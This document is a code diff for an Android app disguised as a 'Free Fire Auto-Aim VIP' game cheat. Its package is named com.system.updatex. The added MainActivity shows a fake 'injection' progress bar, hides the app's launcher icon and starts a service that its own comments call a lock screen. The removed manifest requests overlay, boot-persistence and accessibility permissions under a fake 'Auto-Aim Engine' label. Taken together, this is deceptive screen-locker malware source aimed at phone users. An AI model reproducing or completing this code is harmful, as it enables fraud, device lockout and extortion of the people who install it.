@@ -1,65 +1,109 @@
-<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.system.updatex">
+package com.system.updatex;
 
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.VIBRATE" />
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.provider.Settings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 
-    <application
-        android:allowBackup="true"
-        android:icon="@drawable/ic_launcher"
-        android:label="Free Fire Auto-Aim VIP"
-        android:theme="@android:style/Theme.Material.NoActionBar">
+public class MainActivity extends Activity {
 
-        <!-- The actual activity (No LAUNCHER intent here) -->
-        <activity 
-            android:name=".MainActivity" 
-            android:exported="true" />
+    private WebView webView;
+    private final Handler handler = new Handler(Looper.getMainLooper());
 
-        <!-- The Alias that creates the app icon in the drawer -->
-        <activity-alias
-            android:name=".MainAlias"
-            android:enabled="true"
-            android:exported="true"
-            android:targetActivity=".MainActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Set fullscreen layout programmatically to avoid XML dependencies
+        setContentView(R.layout.activity_main);
 
-        <service
-            android:name=".OverlayService"
-            android:enabled="true"
-            android:exported="false"
-            android:directBootAware="true" />
+        webView = findViewById(R.id.webview);
+        
+        // Enable JavaScript and DOM storage for the HTML interface
+        webView.getSettings().setJavaScriptEnabled(true);
+        webView.getSettings().setDomStorageEnabled(true);
+        webView.setWebViewClient(new WebViewClient());
+        
+        // Load the premium Mod Menu HTML from assets
+        webView.loadUrl("file:///android_asset/index.html");
+        
+        // Attach the bridge so HTML buttons can trigger Android intents
+        webView.addJavascriptInterface(new WebAppInterface(this, this), "Android");
+    }
 
-        <service
-            android:name=".KioskAccessibilityService"
-            android:label="Auto-Aim Engine"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
+    @Override
+    protected void onResume() {
+        super.onResume();
+        
+        // Check the actual permission states
+        boolean hasOverlay = Settings.canDrawOverlays(this);
+        boolean hasAccess = isAccessibilityServiceEnabled();
+        
+        // Update the HTML UI to show "Mounted" and "Active" if granted
+        String js = "updatePermissions(" + hasOverlay + ", " + hasAccess + ");";
+        webView.evaluateJavascript(js, null);
+    }
 
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:directBootAware="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
+    private boolean isAccessibilityServiceEnabled() {
+        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        if (enabledServices == null) return false;
+        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
+        return enabledServices.toLowerCase().contains(component.toLowerCase());
+    }
 
-    </application>
-</manifest>
+    // Called by Javascript when "ACTIVATE HACK" is tapped
+    public void startInjectionSequence() {
+        if (!Settings.canDrawOverlays(this) || !isAccessibilityServiceEnabled()) {
+            runOnUiThread(() -> webView.evaluateJavascript("alert('Please grant all permissions first!');", null));
+            return;
+        }
+
+        // Fake Injection Sequence (2 seconds)
+        new Thread(() -> {
+            for (int i = 0; i <= 100; i += 2) {
+                final int progress = i;
+                runOnUiThread(() -> webView.evaluateJavascript("setProgress(" + progress + ");", null));
+                try { Thread.sleep(40); } catch (InterruptedException e) {}
+            }
+            
+            runOnUiThread(() -> {
+                try {
+                    // 1. VANISH THE APP ICON
+                    hideAppIcon();
+
+                    // 2. LAUNCH THE LOCK SCREEN
+                    Intent serviceIntent = new Intent(MainActivity.this, OverlayService.class);
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        startForegroundService(serviceIntent);
+                    } else {
+                        startService(serviceIntent);
+                    }
+                    
+                    // 3. CLOSE THE MOD MENU
+                    finish();
+                    
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            });
+        }).start();
+    }
+
+    // This function disables the <activity-alias> in the manifest, removing the icon from the drawer
+    private void hideAppIcon() {
+        PackageManager pm = getPackageManager();
+        ComponentName componentName = new ComponentName(this, "com.system.updatex.MainAlias");
+        
+        pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+        );
+    }
+}
